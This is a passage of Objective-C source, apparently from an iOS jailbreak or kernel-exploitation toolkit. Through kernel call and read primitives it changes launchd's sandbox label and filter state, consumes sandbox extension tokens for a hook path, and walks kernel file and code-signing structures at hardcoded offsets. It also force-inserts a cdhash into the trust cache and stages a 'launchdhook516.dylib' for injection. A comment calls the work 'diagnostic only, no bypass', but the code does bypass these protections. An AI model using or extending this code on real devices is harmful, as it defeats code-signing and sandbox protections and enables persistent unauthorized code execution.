        dt1025_log(log, @"[!] build694 post-apply: slot_cfg invalid 0x%llx",
            (unsigned long long)post->slot_cfg);
        return NO;
    }
    if (post->profile_532c68 == 0) {
        dt1025_log(log, @"[!] build694 post-apply: 532C68 still zero");
        return NO;
    }
    if (post->profile_532c68 != post->slot_cfg) {
        dt1025_log(log, @"[!] build694 post-apply: 532C68=0x%llx slot_cfg=0x%llx mismatch",
            (unsigned long long)post->profile_532c68,
            (unsigned long long)post->slot_cfg);
        return NO;
    }
    return YES;
}

static BOOL dt694_opaque_scalar_match(uint64_t base_val, uint64_t rest_val,
    dt690_policy_semantic_t base_sem, dt690_policy_semantic_t rest_sem)
{
    if (base_sem != rest_sem)
        return NO;
    if (base_sem == dt690_sem_error)
        return NO;
    return base_val == rest_val;
}

static int dt694_restore_sequence(uint64_t proc_kptr, uint64_t label_kptr,
    uint32_t baseline_fmsg, void (^log)(NSString *line), int *failed_step_out)
{
    int step = 0;
    int kern = 0;

    step = 1;
    if (dt694_kcall_532a80_label_null(label_kptr, log, &kern) != 0) {
        if (failed_step_out)
            *failed_step_out = step;
        return -1;
    }
    dt694_emit_kv(log, "KCALL694_532A80_RET", (uint64_t)(uint32_t)kern);

    step = 2;
    if (dt688a_kcall_filter_msg_set(proc_kptr, baseline_fmsg, log, &kern) != 0) {
        if (failed_step_out)
            *failed_step_out = step;
        return -2;
    }
    dt694_emit_kv(log, "KCALL694_FMSG_RESTORE_RET", (uint64_t)(uint32_t)kern);
    if (kern != 0) {
        dt1025_log(log, @"[!] build694 restore fmsg_set kern_ret=%d", kern);
        if (failed_step_out)
            *failed_step_out = step;
        return -3;
    }

    step = 3;
    if (dt688a_kcall_5329ac(proc_kptr, 0, log, &kern) != 0) {
        if (failed_step_out)
            *failed_step_out = step;
        return -4;
    }
    dt694_emit_kv(log, "KCALL694_5329AC_RET", (uint64_t)(uint32_t)kern);
    if (kern != 0) {
        dt1025_log(log, @"[!] build694 restore 5329AC(NULL) kern_ret=%d", kern);
        if (failed_step_out)
            *failed_step_out = step;
        return -5;
    }

    if (failed_step_out)
        *failed_step_out = 0;
    return 0;
}

static void dt694_log_field_diff(void (^log)(NSString *line), const char *field,
    uint64_t base, uint64_t rest)
{
    dt1025_log(log, @"[!] build694 diff %s baseline=0x%llx restored=0x%llx",
        field, (unsigned long long)base, (unsigned long long)rest);
}

static BOOL dt694_compare_states(const dt694_wall2_state_t *base,
    const dt694_wall2_state_t *rest, void (^log)(NSString *line),
    BOOL *slot_cfg_ok, BOOL *profile_ok, BOOL *unix_ok, BOOL *mach_ok,
    BOOL *mig_ok, BOOL *fmsg_ok)
{
    BOOL sc = (base->slot_cfg == rest->slot_cfg);
    BOOL pr = (base->profile_532c68 == rest->profile_532c68);
    BOOL ux = dt694_opaque_scalar_match(base->unix_token, rest->unix_token,
        base->unix_sem, rest->unix_sem);
    BOOL mc = dt694_opaque_scalar_match(base->mach_token, rest->mach_token,
        base->mach_sem, rest->mach_sem);
    BOOL mg = (base->mig_sem == rest->mig_sem);
    BOOL fm = NO;
    if (base->fmsg_valid && rest->fmsg_valid) {
        fm = (base->filter_message == rest->filter_message
            && base->fmsg_state == rest->fmsg_state);
    } else if (!base->fmsg_valid && !rest->fmsg_valid) {
        fm = (base->fmsg_state == rest->fmsg_state);
    }

    if (!sc)
        dt694_log_field_diff(log, "slot_cfg", base->slot_cfg, rest->slot_cfg);
    if (!pr)
        dt694_log_field_diff(log, "532C68", base->profile_532c68, rest->profile_532c68);
    if (!ux)
        dt1025_log(log, @"[!] build694 diff unix baseline_sem=%s token=0x%llx "
            @"restored_sem=%s token=0x%llx",
            dt690_sem_name(base->unix_sem), (unsigned long long)base->unix_token,
            dt690_sem_name(rest->unix_sem), (unsigned long long)rest->unix_token);
    if (!mc)
        dt1025_log(log, @"[!] build694 diff mach baseline_sem=%s token=0x%llx "
            @"restored_sem=%s token=0x%llx",
            dt690_sem_name(base->mach_sem), (unsigned long long)base->mach_token,
            dt690_sem_name(rest->mach_sem), (unsigned long long)rest->mach_token);
    if (!mg)
        dt1025_log(log, @"[!] build694 diff mig baseline=%s restored=%s",
            dt690_sem_name(base->mig_sem), dt690_sem_name(rest->mig_sem));
    if (!fm)
        dt1025_log(log, @"[!] build694 diff fmsg baseline_valid=%d state=%d val=%u "
            @"restored_valid=%d state=%d val=%u",
            base->fmsg_valid ? 1 : 0, (int)base->fmsg_state,
            (unsigned)base->filter_message,
            rest->fmsg_valid ? 1 : 0, (int)rest->fmsg_state,
            (unsigned)rest->filter_message);

    if (slot_cfg_ok)
        *slot_cfg_ok = sc;
    if (profile_ok)
        *profile_ok = pr;
    if (unix_ok)
        *unix_ok = ux;
    if (mach_ok)
        *mach_ok = mc;
    if (mig_ok)
        *mig_ok = mg;
    if (fmsg_ok)
        *fmsg_ok = fm;

    dt694_stage(sc ? "KCALL694_COMPARE_SLOT_CFG_PASS" : "KCALL694_COMPARE_SLOT_CFG_FAIL");
    dt694_stage(pr ? "KCALL694_COMPARE_532C68_PASS" : "KCALL694_COMPARE_532C68_FAIL");
    dt694_stage(ux ? "KCALL694_COMPARE_UNIX_PASS" : "KCALL694_COMPARE_UNIX_FAIL");
    dt694_stage(mc ? "KCALL694_COMPARE_MACH_PASS" : "KCALL694_COMPARE_MACH_FAIL");
    dt694_stage(mg ? "KCALL694_COMPARE_MIG_PASS" : "KCALL694_COMPARE_MIG_FAIL");
    dt694_stage(fm ? "KCALL694_COMPARE_FMSG_PASS" : "KCALL694_COMPARE_FMSG_FAIL");

    return sc && pr && ux && mc && mg && fm;
}

int dt694_run_wall2_restore_sync_probe(void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt694_stage("KCALL694_WALL2_BEGIN");

    if (dt1025_kcall_init(log) != 0) {
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL694_KCALL_INIT_FAIL");
        return -1;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL694_CALIBRATION_PROC_FAIL");
        return -2;
    }

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL694_KCALL_CALIBRATION_FAIL");
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -3;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL694_LAUNCHD_PROC_FAIL");
        return -4;
    }

    BOOL pointer_cal_ok = NO;
    NSString *ptrCalFail = nil;
    if (dt692_pointer_return_calibration(launchd_proc, log, &pointer_cal_ok, &ptrCalFail) != 0
        || !pointer_cal_ok) {
        dt694_stage("KCALL694_ABORT_POINTER_CAL");
        dt1025_set_verdict(verdictOut, ptrCalFail ?: @"KCALL694_ABORT_POINTER_CAL");
        proc_rele(launchd_proc);
        return -5;
    }

    dt694_wall2_state_t baseline = {0};
    dt694_wall2_state_t post_apply = {0};
    dt694_wall2_state_t post_consume = {0};
    dt694_wall2_state_t restored = {0};
    dt691_ro_zone_globals_t ro = {0};

    if (dt691_load_ro_zone_globals(&ro, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL694_RO_ZONE_GLOBALS_FAIL");
        proc_rele(launchd_proc);
        return -6;
    }

    /* Phase 0 — baseline */
    dt694_stage("KCALL694_BASELINE_BEGIN");
    if (dt694_capture_state(launchd_proc, &ro, &baseline, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL694_BASELINE_CAPTURE_FAIL");
        proc_rele(launchd_proc);
        return -6;
    }
    if (!dt694_baseline_coherent(&baseline, log)) {
        dt1025_set_verdict(verdictOut, @"KCALL694_BASELINE_INCOHERENT");
        proc_rele(launchd_proc);
        return -7;
    }

    dt694_emit_kv(log, "KCALL694_BASELINE_PROC", baseline.proc);
    dt694_emit_kv_u32(log, "KCALL694_BASELINE_ECACE4", baseline.ecace4);
    dt694_emit_kv(log, "KCALL694_BASELINE_SLOT_CFG", baseline.slot_cfg);
    dt694_emit_kv(log, "KCALL694_BASELINE_SLOT0_DIAG", baseline.slot0_diag);
    dt694_emit_kv(log, "KCALL694_BASELINE_532C68", baseline.profile_532c68);
    dt694_emit_kv(log, "KCALL694_BASELINE_UNIX", baseline.unix_token);
    dt694_emit_sem(log, "KCALL694_BASELINE_UNIX_SEM", baseline.unix_sem);
    dt694_emit_kv(log, "KCALL694_BASELINE_MACH", baseline.mach_token);
    dt694_emit_sem(log, "KCALL694_BASELINE_MACH_SEM", baseline.mach_sem);
    dt694_emit_sem(log, "KCALL694_BASELINE_MIG", baseline.mig_sem);
    dt694_emit_kv_u32(log, "KCALL694_BASELINE_FMSG", baseline.filter_message);
    dt694_stage("KCALL694_BASELINE_CAPTURE_PASS");

    /* Phase 1 — 53D540 apply */
    dt694_stage("KCALL694_APPLY_BEGIN");
    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    int apply_kern_ret = -1;
    if (dt1025_kcall_53d540(launchd_proc, &bundle, log, &apply_kern_ret) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL694_APPLY_DISPATCH_FAIL");
        proc_rele(launchd_proc);
        return -8;
    }
    dt694_emit_kv(log, "KCALL694_53D540_RET", (uint64_t)(uint32_t)apply_kern_ret);
    if (apply_kern_ret != 0) {
        dt694_stage("KCALL694_APPLY_PROFILE_MATCH_FAIL");
        dt1025_set_verdict(verdictOut, @"KCALL694_APPLY_KERN_FAIL");
        proc_rele(launchd_proc);
        return -9;
    }

    if (dt694_capture_state(launchd_proc, &ro, &post_apply, log) != 0) {
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, dt694_live_label(launchd_proc),
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_POST_APPLY_CAPTURE_FAIL");
        proc_rele(launchd_proc);
        return -10;
    }

    dt694_emit_kv_u32(log, "KCALL694_POST_APPLY_ECACE4", post_apply.ecace4);
    dt694_emit_kv(log, "KCALL694_POST_APPLY_SLOT_CFG", post_apply.slot_cfg);
    dt694_emit_kv(log, "KCALL694_POST_APPLY_532C68", post_apply.profile_532c68);
    dt694_emit_kv(log, "KCALL694_POST_APPLY_LABEL", post_apply.label);

    if (!dt694_post_apply_valid(&baseline, &post_apply, log)) {
        dt694_stage("KCALL694_APPLY_PROFILE_MATCH_FAIL");
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, post_apply.label,
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_APPLY_PROFILE_MATCH_FAIL");
        proc_rele(launchd_proc);
        return -11;
    }
    dt694_stage("KCALL694_APPLY_PROFILE_MATCH_PASS");

    /* Phase 2 — consume */
    char *read_token = dt1025_issue_token_path(kDTClassRead, dt102710_hook_path_cstr(), log);
    char *exec_token = dt1025_issue_token_path(kDTClassExec, dt102710_hook_path_cstr(), log);
    if (!read_token || !exec_token) {
        if (read_token)
            sandbox_extension_release(read_token);
        if (exec_token)
            sandbox_extension_release(exec_token);
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, post_apply.label,
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_EXTENSION_ISSUE_FAIL");
        proc_rele(launchd_proc);
        return -12;
    }

    uint64_t pre_read_profile = post_apply.profile_532c68;
    uint64_t pre_read_slot = post_apply.slot_cfg;

    dt694_stage("KCALL694_CONSUME_READ_BEGIN");
    int read_kern_ret = -1;
    int64_t read_handle = dt1025_kcall_consume_token(launchd_proc, read_token, log, &read_kern_ret);
    dt694_emit_kv(log, "KCALL694_CONSUME_READ_RET", (uint64_t)(uint32_t)read_kern_ret);
    dt694_emit_kv(log, "KCALL694_CONSUME_READ_HANDLE", (uint64_t)read_handle);

    if (read_kern_ret != 0 || read_handle == 0) {
        sandbox_extension_release(read_token);
        sandbox_extension_release(exec_token);
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, dt694_live_label(launchd_proc),
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_CONSUME_READ_FAIL");
        proc_rele(launchd_proc);
        return -13;
    }
    dt694_stage("KCALL694_CONSUME_READ_PASS");

    dt694_stage("KCALL694_CONSUME_EXEC_BEGIN");
    int exec_kern_ret = -1;
    int64_t exec_handle = dt1025_kcall_consume_token(launchd_proc, exec_token, log, &exec_kern_ret);
    sandbox_extension_release(read_token);
    sandbox_extension_release(exec_token);
    dt694_emit_kv(log, "KCALL694_CONSUME_EXEC_RET", (uint64_t)(uint32_t)exec_kern_ret);
    dt694_emit_kv(log, "KCALL694_CONSUME_EXEC_HANDLE", (uint64_t)exec_handle);

    if (exec_kern_ret != 0 || exec_handle == 0) {
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, dt694_live_label(launchd_proc),
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_CONSUME_EXEC_FAIL");
        proc_rele(launchd_proc);
        return -14;
    }
    dt694_stage("KCALL694_CONSUME_EXEC_PASS");

    if (dt694_capture_state(launchd_proc, &ro, &post_consume, log) != 0) {
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, dt694_live_label(launchd_proc),
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_POST_CONSUME_CAPTURE_FAIL");
        proc_rele(launchd_proc);
        return -15;
    }

    dt1025_log(log, @"[*] build694 post-consume profile=0x%llx slot_cfg=0x%llx "
        @"(pre_read profile=0x%llx slot=0x%llx)",
        (unsigned long long)post_consume.profile_532c68,
        (unsigned long long)post_consume.slot_cfg,
        (unsigned long long)pre_read_profile,
        (unsigned long long)pre_read_slot);

    if (post_consume.profile_532c68 == 0
        || post_consume.profile_532c68 != post_consume.slot_cfg
        || post_consume.profile_532c68 != pre_read_profile) {
        int fail_step = 0;
        (void)dt694_restore_sequence(launchd_proc, post_consume.label,
            baseline.filter_message, log, &fail_step);
        dt1025_set_verdict(verdictOut, @"KCALL694_POST_CONSUME_PROFILE_INCOHERENT");
        proc_rele(launchd_proc);
        return -16;
    }

    /* Phase 3 — restore (live post-apply label, not stale baseline label) */
    uint64_t restore_label = dt694_live_label(launchd_proc);
    if (!restore_label) {
        dt1025_set_verdict(verdictOut, @"KCALL694_RESTORE_LABEL_MISSING");
        proc_rele(launchd_proc);
        return -17;
    }

    dt694_stage("KCALL694_RESTORE_BEGIN");
    dt694_emit_kv(log, "KCALL694_RESTORE_LABEL", restore_label);
    dt1025_log(log, @"[*] build694 restore: baseline_label=0x%llx post_apply_label=0x%llx "
        @"live_label=0x%llx",
        (unsigned long long)baseline.label,
        (unsigned long long)post_apply.label,
        (unsigned long long)restore_label);

    int restore_fail_step = 0;
    int restore_r = dt694_restore_sequence(launchd_proc, restore_label,
        baseline.filter_message, log, &restore_fail_step);
    if (restore_r != 0) {
        dt1025_log(log, @"[!] build694 restore failed at step=%d r=%d",
            restore_fail_step, restore_r);
        dt1025_set_verdict(verdictOut, @"KCALL694_RESTORE_CALLS_FAIL");
        proc_rele(launchd_proc);
        return -18;
    }
    dt694_stage("KCALL694_RESTORE_CALLS_COMPLETE");

    /* Phase 4 — compare */
    dt694_stage("KCALL694_POST_RESTORE_CAPTURE_BEGIN");
    if (dt694_capture_state(launchd_proc, &ro, &restored, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL694_POST_RESTORE_CAPTURE_FAIL");
        proc_rele(launchd_proc);
        return -19;
    }

    BOOL slot_ok = NO, prof_ok = NO, unix_ok = NO, mach_ok = NO, mig_ok = NO, fmsg_ok = NO;
    BOOL state_match = dt694_compare_states(&baseline, &restored, log,
        &slot_ok, &prof_ok, &unix_ok, &mach_ok, &mig_ok, &fmsg_ok);

    if (!state_match) {
        dt694_stage("KCALL694_RESTORE_STATE_MISMATCH");
        dt1025_set_verdict(verdictOut, @"KCALL694_RESTORE_STATE_MISMATCH");
        proc_rele(launchd_proc);
        return -20;
    }
    dt694_stage("KCALL694_RESTORE_STATE_MATCH");

    /* Phase 5 — sync survival */
    dt694_stage("KCALL694_SYNC_OBSERVATION_BEGIN");
    dt694_stage("KCALL694_SYNC_INTERVAL_SOURCE=default");
    dt694_emit_kv_u32(log, "KCALL694_SYNC_INTERVAL_VALUE", kDT694DefaultSyncIntervalSec);
    dt1025_log(log, @"[*] build694 observe %us (default T=%u, conservative >T)",
        (unsigned)kDT694SyncObserveSec, (unsigned)kDT694DefaultSyncIntervalSec);
    sleep(kDT694SyncObserveSec);
    dt694_emit_kv_u32(log, "KCALL694_SYNC_OBSERVATION_ELAPSED", kDT694SyncObserveSec);

    if (kill(1, 0) != 0) {
        dt1025_log(log, @"[!] build694 launchd not alive errno=%d", errno);
        dt694_stage("KCALL694_WALL2_RESTORE_SYNC_FAIL_LAUNCHD_DEAD");
        dt1025_set_verdict(verdictOut, @"KCALL694_WALL2_RESTORE_SYNC_FAIL_LAUNCHD_DEAD");
        proc_rele(launchd_proc);
        return -21;
    }

    dt694_stage("KCALL694_LAUNCHD_ALIVE_AFTER_SYNC");
    dt694_stage("KCALL694_WALL2_RESTORE_SYNC_PASS");
    dt1025_set_verdict(verdictOut, @"KCALL694_WALL2_RESTORE_SYNC_PASS");
    proc_rele(launchd_proc);
    return 0;
}

/* =============================================================================
 * BUILD102696 — B4-FILE gated dynamic diagnostic (diagnostic only, no bypass)
 * Stages D0–D7: preflight → vnode → blob → stability → zone8 RMW → LV count → retry → cleanup
 * ============================================================================= */

static const uint32_t kDT696PlatformFieldOff = 0xACU;

typedef struct {
    uint64_t vnode;
    uint64_t ubc_info;
    uint64_t cs_blob;
    uint8_t platform;
    BOOL valid;
} dt696_blob_chain_t;

static void dt696_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static void dt696_emit_kv(void (^log)(NSString *line), const char *key, uint64_t val)
{
    dt1025_log(log, @"[*] %s=0x%llx", key, (unsigned long long)val);
    dt696_stage(key);
}

static BOOL dt696_kptr_valid(uint64_t p)
{
    if (!p)
        return NO;
    if ((p & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
        return NO;
    if (p < 0xFFFFFE0000000000ULL)
        return NO;
    if ((p & 7) != 0)
        return NO;
    return YES;
}

static BOOL dt696_in_ro_zone8(uint64_t kva)
{
    if (!dt696_kptr_valid(kva))
        return NO;
    dt691_ro_zone_globals_t ro = {0};
    if (dt691_load_ro_zone_globals(&ro, NULL) != 0)
        return NO;
    if (kva < ro.ro_lo || kva >= ro.ro_hi)
        return NO;
    return YES;
}

static int dt697_resolve_vnode_from_fd(int fd, uint64_t *vnode_out, void (^log)(NSString *line))
{
    /* IDA j105a 20L563 fresh reconfirm (2026-07-06):
     *   _proc_fdlist @ 0xFFFFFFF0076757F4  — proc+0xF8 ofiles[], proc+0x100 fflags[]
     *   sub_FFFFFFF0075B785C               — proc+0xE4 nfiles bound; fd flag &4 guard
     *   _fp_getfvp @ 0xFFFFFFF0075B7EC8    — fileproc+0x10 fg; fg+0x38 vnode */
    enum {
        kDT697ProcFdNfiles = 0xE4,   /* *(proc+0xE4) — fail if fd >= nfiles */
        kDT697ProcFdOfiles = 0xF8,   /* *(proc+0xF8) — pointer to fileproc*[] */
        kDT697ProcFdFflags = 0x100,  /* *(proc+0x100) — per-fd flag bytes */
        kDT697FpGlobOff = 0x10,      /* fileproc+0x10 → fileglob */
        kDT697FgVnodeOff = 0x38,     /* fileglob+0x38 → vnode */
        kDT697FdFlagGuard = 4,
    };

    if (!vnode_out || fd < 0)
        return -1;

    dt_misaka_offsets_init();
    const dt_misaka_offsets_t *o = &g_misaka_offsets;

    dt1025_log(log, @"[*] KCALL697_FD_VALUE=%d", fd);
    dt696_stage("KCALL697_FD_VALUE");

    uint64_t proc = proc_find(getpid());
    if (!proc) {
        dt1025_log(log, @"[!] build697 proc_find(self) failed");
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_PROC");
        return -2;
    }
    dt696_emit_kv(log, "KCALL697_PROC_KVA", proc);

    uint32_t nfiles = kread32(proc + kDT697ProcFdNfiles);
    dt1025_log(log, @"[*] KCALL697_NFILES=%u", (unsigned)nfiles);
    dt696_stage("KCALL697_NFILES");

    if ((uint32_t)fd >= nfiles) {
        dt1025_log(log, @"[!] build697 fd %d out of range nfiles=%u", fd, (unsigned)nfiles);
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_NFILES");
        proc_rele(proc);
        return -3;
    }

    uint64_t ofiles = kread64(proc + kDT697ProcFdOfiles);
    dt696_emit_kv(log, "KCALL697_OFILES_PTR", ofiles);
    if (!dt696_kptr_valid(ofiles)) {
        dt1025_log(log, @"[!] build697 ofiles ptr invalid");
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_OFILES");
        proc_rele(proc);
        return -4;
    }

    uint64_t fflags = kread64(proc + kDT697ProcFdFflags);
    dt696_emit_kv(log, "KCALL697_FFLAGS_PTR", fflags);
    if (!dt696_kptr_valid(fflags)) {
        dt1025_log(log, @"[!] build697 fflags ptr invalid");
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_FFLAGS");
        proc_rele(proc);
        return -5;
    }

    uint8_t fd_flags = kread8(fflags + (uint64_t)fd);
    dt1025_log(log, @"[*] KCALL697_FD_FLAGS=0x%02x", (unsigned)fd_flags);
    dt696_stage("KCALL697_FD_FLAGS");
    if ((fd_flags & kDT697FdFlagGuard) != 0) {
        dt1025_log(log, @"[!] build697 fd %d guarded (flags&4)", fd);
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_FD_GUARDED");
        proc_rele(proc);
        return -6;
    }

    uint64_t fileproc = kread64(ofiles + (uint64_t)fd * 8ULL);
    dt696_emit_kv(log, "KCALL697_FILEPROC_KVA", fileproc);
    if (!dt696_kptr_valid(fileproc)) {
        dt1025_log(log, @"[!] build697 fileproc[%d] null/invalid", fd);
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_FILEPROC");
        proc_rele(proc);
        return -7;
    }

    uint64_t fg = kread64(fileproc + kDT697FpGlobOff);
    dt696_emit_kv(log, "KCALL697_FILEGLOB_KVA", fg);
    if (!dt696_kptr_valid(fg)) {
        dt1025_log(log, @"[!] build697 fileglob invalid");
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_FILEGLOB");
        proc_rele(proc);
        return -8;
    }

    uint64_t vnode = kread64(fg + kDT697FgVnodeOff);
    proc_rele(proc);

    dt696_emit_kv(log, "KCALL697_VNODE_KVA", vnode);
    if (!dt696_kptr_valid(vnode)) {
        dt1025_log(log, @"[!] build697 vnode invalid");
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_VNODE");
        return -9;
    }

    uint16_t vtype = kread16(vnode + o->off_vnode_v_type);
    dt1025_log(log, @"[*] KCALL697_VNODE_TYPE=%u", (unsigned)vtype);
    dt696_stage("KCALL697_VNODE_TYPE");
    if (vtype != 1) {
        dt1025_log(log, @"[!] build697 vnode type=%u (expected 1 VREG)", (unsigned)vtype);
        dt696_stage("KCALL697_VNODE_LOOKUP_FAIL_VNODE_TYPE");
        return -10;
    }

    *vnode_out = vnode;
    return 0;
}

static int dt696_read_blob_chain(uint64_t vnode, dt696_blob_chain_t *out, void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));
    out->vnode = vnode;

    dt_misaka_offsets_init();
    const dt_misaka_offsets_t *o = &g_misaka_offsets;

    uint64_t ubc = kread64(vnode + o->off_vnode_vu_ubcinfo);
    if (!dt696_kptr_valid(ubc)) {
        dt1025_log(log, @"[!] build696 ubc_info null/invalid");
        return -2;
    }
    out->ubc_info = ubc;

    uint64_t blob = kread64(ubc + o->off_ubc_info_cs_blobs);
    if (!dt696_kptr_valid(blob)) {
        dt1025_log(log, @"[!] build696 cs_blob null/invalid");
        return -3;
    }
    out->cs_blob = blob;

    if (!dt696_in_ro_zone8(blob)) {
        dt1025_log(log, @"[!] build696 cs_blob 0x%llx outside RO zone map window",
            (unsigned long long)blob);
        return -4;
    }

    out->platform = kread8(blob + kDT696PlatformFieldOff);
    out->valid = YES;
    return 0;
}

static NSString *dt696_blob_identity(const dt696_blob_chain_t *c)
{
    if (!c || !c->valid)
        return @"INVALID";
    return [NSString stringWithFormat:@"vnode=0x%llx ubc=0x%llx blob=0x%llx plat=0x%02x",
        (unsigned long long)c->vnode, (unsigned long long)c->ubc_info,
        (unsigned long long)c->cs_blob, (unsigned)c->platform];
}

static NSString *dt696_classify_identity(uint64_t pre_blob, uint64_t post_blob)
{
    if (!pre_blob && post_blob)
        return @"NULL_TO_BLOB";
    if (pre_blob && !post_blob)
        return @"BLOB_TO_NULL";
    if (!pre_blob && !post_blob)
        return @"UNSTABLE_CHAIN";
    if (pre_blob == post_blob)
        return @"SAME_BLOB";
    return @"NEW_BLOB";
}

static unsigned dt696_count_lv_substrings(NSString *capture, void (^log)(NSString *line))
{
    (void)log;
    if (!capture.length)
        return 0;

    unsigned hit = 0;
    NSUInteger start = 0;
    NSString *needle = @"Library Validation";
    while (start < capture.length) {
        NSRange r = [capture rangeOfString:needle options:0 range:NSMakeRange(start, capture.length - start)];
        if (r.location == NSNotFound)
            break;
        hit++;
        char marker[48];
        snprintf(marker, sizeof(marker), "KCALL696_LV_HIT_%u", hit);
        dt696_stage(marker);
        start = r.location + r.length;
    }
    return hit;
}

static int dt696_stage_hook_trustcache(const char *path, void (^log)(NSString *line))
{
    cdhash_t hash = {0};
    if (dt_macho_best_cdhash_from_path(path, hash) != 0) {
        dt696_stage("KCALL696_TRUSTCACHE_CDHash_FAIL");
        return -1;
    }
    uint32_t uploaded = 0;
    if (dt_trustcache_upload_cdhashes_force(&hash, 1, &uploaded) != 0) {
        dt696_stage("KCALL696_TRUSTCACHE_UPLOAD_FAIL");
        return -2;
    }
    if (!dt_cdhash_trustcached(hash)) {
        dt696_stage("KCALL696_TRUSTCACHE_VERIFY_FAIL");
        return -3;
    }
    dt696_stage("KCALL696_TRUSTCACHE_HOOK_OK");
    dt696_stage([[NSString stringWithFormat:@"BUILD102710_TRUST_HOOK_PASS=%@",
        dt_cdhash_hex_string(hash)] UTF8String]);
    return 0;
}

static int dt696_copy_hook_to_stage(void (^log)(NSString *line))
{
    NSString *bundled = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516/launchdhook516.dylib"];
    NSString *dest = dt102710_hook_path_ns();
    NSString *parent = [dest stringByDeletingLastPathComponent];
    [[NSFileManager defaultManager] createDirectoryAtPath:parent
        withIntermediateDirectories:YES attributes:nil error:nil];
    if (![[NSFileManager defaultManager] fileExistsAtPath:bundled]) {
        dt1025_log(log, @"[!] build696 missing bundled hook %@", bundled);
        return -1;
    }
    [[NSFileManager defaultManager] removeItemAtPath:dest error:nil];
    NSError *err = nil;
    if (![[NSFileManager defaultManager] copyItemAtPath:bundled toPath:dest error:&err]) {
        dt1025_log(log, @"[!] build696 stage copy fail %@", err);
        return -2;
    }
    chmod(dt102710_hook_path_cstr(), 0755);
    dt696_stage("KCALL696_TARGET_STAGED");
    return 0;
}

static int dt697_dlopen_once_count_lv(const char *path, unsigned *lv_count_out,
    NSString **capture_out, void (^log)(NSString *line))
{
    if (lv_count_out)
        *lv_count_out = 0;

    dt696_stage("KCALL697_DLOPEN_WINDOW_BEGIN");
    dt696_stage("KCALL696_DLOPEN_SINGLE_BEGIN");

    NSMutableString *capture = [NSMutableString string];
    __block BOOL sawLine = NO;
    [[DTLogCapture sharedCapture] startWithHandler:^(NSString *line) {
        sawLine = YES;
        [capture appendFormat:@"%@\n", line ?: @""];
    }];

    dlerror();
    void *h = dlopen(path, RTLD_NOW);
    const char *dle = dlerror();
    int dl_errno = errno;

    [[DTLogCapture sharedCapture] stop];
    dt696_stage("KCALL697_DLOPEN_WINDOW_END");

    NSString *logPath = [DTRunLogger logFilePath];
    NSString *logText = [NSString stringWithContentsOfFile:logPath
        encoding:NSUTF8StringEncoding error:nil] ?: @"";
    [capture appendString:logText];

    if (capture_out)
        *capture_out = [capture copy];

    dt1025_log(log, @"[*] build697 dlopen handle=%p dlerror=%s errno=%d saw_stdio=%d",
        h, dle ?: "(null)", dl_errno, sawLine ? 1 : 0);

    if (h) {
        dlclose(h);
        dt696_stage("KCALL696_DLOPEN_SINGLE_RESULT=UNEXPECTED_SUCCESS");
    } else {
        dt696_stage("KCALL696_DLOPEN_SINGLE_RESULT=FAIL_AS_EXPECTED");
    }

    unsigned hits = dt696_count_lv_substrings(capture, log);
    if (lv_count_out)
        *lv_count_out = hits;

    dt1025_log(log, @"[*] build697 LV app-log substring hits=%u (BEST_EFFORT only)", hits);
    return h ? 1 : 0;
}

static int dt696_dlopen_once_count_lv(const char *path, unsigned *lv_count_out,
    NSString **capture_out, void (^log)(NSString *line))
{
    return dt697_dlopen_once_count_lv(path, lv_count_out, capture_out, log);
}

int dt697_run_b4file_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    NSString *finalClass = @"BUILD102697_DIAGNOSTIC_FAIL";
    NSString *vnodeRes = @"FAIL";
    NSString *blobRes = @"FAIL";
    NSString *postFailBlob = @"UNKNOWN";
    NSString *retryBlob = @"UNKNOWN";
    NSString *zone8Write = @"NOT_RUN";
    NSString *zone8Restore = @"NOT_RUN";
    NSString *lvCountStr = @"UNKNOWN";
    NSString *lvBlobReuse = @"UNKNOWN";
